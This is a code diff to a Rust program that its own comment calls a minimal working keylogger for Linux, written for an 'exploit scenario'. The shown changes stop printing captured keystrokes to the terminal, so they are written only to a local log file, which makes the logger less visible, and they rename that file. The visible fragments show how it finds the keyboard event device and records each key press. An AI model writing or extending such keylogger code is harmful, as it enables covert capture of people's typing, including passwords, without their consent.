@@ -5,8 +5,8 @@ use byteorder::{LittleEndian, ReadBytesExt};
 
 
 /* This is a minimal working keylogger for Linux which dumps the logged
- * keyboard events to a file and stdout until it is stopped externally. It 
- * is written to fail fast: it panics directly whenever something unexpected 
+ * keyboard events to a file until it is stopped externally. It is written
+ * to fail fast: it panics directly whenever something unexpected
  * happens. This is ok for our exploit scenario.
  */
 
@@ -30,7 +30,7 @@ fn main() {
   println!("Found keyboard at: {}", abs_event_file);
 
   //Output file to dump logged key events in
-  let mut output_file = File::create("./logged_keyboard_event.txt").unwrap();
+  let mut output_file = File::create("./logged_keyboard_events.txt").unwrap();
 
   //Open the event file for reading
   let mut kbd_file = File::open(abs_event_file).unwrap();
@@ -85,8 +85,6 @@ fn main() {
     //Print the key values
     if value == KEY_PRESS && code < MAX_KEYS {
       let i = arr[code as usize];
-      print!("{}", i);
-      std::io::stdout().flush().unwrap();
       //Store in output file
       write!(output_file, "{}", i).unwrap();
       output_file.flush().unwrap();
